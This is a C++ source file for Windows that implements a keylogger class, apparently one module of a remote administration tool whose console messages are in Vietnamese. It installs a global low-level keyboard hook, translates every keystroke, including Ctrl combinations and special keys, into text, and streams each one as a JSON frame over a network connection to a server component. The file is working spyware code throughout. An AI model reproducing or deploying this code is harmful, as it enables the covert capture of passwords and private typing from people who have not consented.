#include <windows.h>
#include <iostream>
#include <thread>
#include <string>
#include <atomic>
#include <vector>
#include "../Network/ServerNetwork.h"
#include "../ThirdParty/json.hpp"

using namespace std;
using json = nlohmann::json;

HHOOK hHook = NULL;
ServerNetwork* g_Server = NULL;
std::atomic<bool> isRunning(false); 
DWORD hookThreadId = 0;

class Keylogger {
private:
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
            
            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
            int vkCode = pKey->vkCode;
            string output = "";

            bool isCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
            bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            bool isNumLock = (GetKeyState(VK_NUMLOCK) & 0x0001) != 0; 
            if (vkCode == VK_RETURN) output = "[Enter]";
            else if (vkCode == VK_BACK) output = "[BS]";
            else if (vkCode == VK_TAB) output = "[Tab]";
            else if (vkCode == VK_ESCAPE) output = "[Esc]";
            else if (vkCode == VK_DELETE) output = "[Del]";
            else if (vkCode == VK_CAPITAL) output = "[CapsLock]";
            else if (vkCode == VK_SPACE) output = " ";
            else if (vkCode == VK_LEFT) output = "[Left]";
            else if (vkCode == VK_RIGHT) output = "[Right]";
            else if (vkCode == VK_UP) output = "[Up]";
            else if (vkCode == VK_DOWN) output = "[Down]";
            else if (vkCode == VK_HOME) output = "[Home]";
            else if (vkCode == VK_END) output = "[End]";
            else if (vkCode == VK_PRIOR) output = "[PgUp]";
            else if (vkCode == VK_NEXT) output = "[PgDn]";
            else if (vkCode == VK_INSERT) output = "[Ins]";
            else if (vkCode == VK_LWIN || vkCode == VK_RWIN) output = "[Win]";
            else if (vkCode == VK_APPS) output = "[Menu]";
            else if (vkCode == VK_SNAPSHOT) output = "[PrintScreen]";
            else if (vkCode == VK_SCROLL) output = "[ScrollLock]";
            else if (vkCode == VK_PAUSE) output = "[Pause]";
            else if (vkCode >= VK_F1 && vkCode <= VK_F24) {
                output = "[F" + to_string(vkCode - VK_F1 + 1) + "]";
            }
            else if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT || 
                     vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
                     vkCode == VK_LMENU || vkCode == VK_RMENU) {
            }
            else {
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);

                keyboardState[VK_SHIFT] = isShift ? 0x80 : 0;
                keyboardState[VK_CAPITAL] = isCaps ? 0x01 : 0;
                keyboardState[VK_NUMLOCK] = isNumLock ? 0x01 : 0; 
                keyboardState[VK_CONTROL] = 0; 
                keyboardState[VK_LCONTROL] = 0;
                keyboardState[VK_RCONTROL] = 0;
                char buffer[2] = {0};
                int result = ToAscii(vkCode, pKey->scanCode, keyboardState, (LPWORD)buffer, 0);

                if (result == 1) {
                    char ch = buffer[0];
                    if (isCtrl && isprint(ch)) { 
                        output = "[Ctrl+" + string(1, toupper(ch)) + "]";
                    } 
                    else {
                        output = string(1, ch);
                    }
                }
            }

            if (!output.empty() && g_Server != NULL && isRunning) {
                cout << output; 
                json j;
                j["type"] = "KEYLOG_DATA";
                j["payload"] = { {"keyStroke", output} };
                g_Server->SendFrame(j.dump());
            }
        }
        return CallNextHookEx(hHook, nCode, wParam, lParam);
    }

    static void Loop() {
        hookThreadId = GetCurrentThreadId();
        
        hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        
        if (hHook == NULL) {
            cout << ">> [LOI] Khong the cai dat Hook!" << endl;
            isRunning = false;
            return;
        }

        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            if (msg.message == WM_QUIT) break;
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        if (hHook) {
            UnhookWindowsHookEx(hHook);
            hHook = NULL;
        }
        isRunning = false;
    }

public:
    static void Start(ServerNetwork& server) {
        if (isRunning) {
            cout << ">> Keylogger dang chay roi (bo qua lenh Start)." << endl;
            return;
        }

        g_Server = &server;
        isRunning = true;

        thread t(Loop);
        t.detach();
        cout << ">> Keylogger: DA BAT." << endl;
    }

    static void Stop() {
        if (!isRunning) return;

        if (hookThreadId != 0) {
            PostThreadMessage(hookThreadId, WM_QUIT, 0, 0);
        }
        
        Sleep(100);
        isRunning = false;
        g_Server = NULL;
        cout << ">> Keylogger: DA TAT." << endl;
    }
};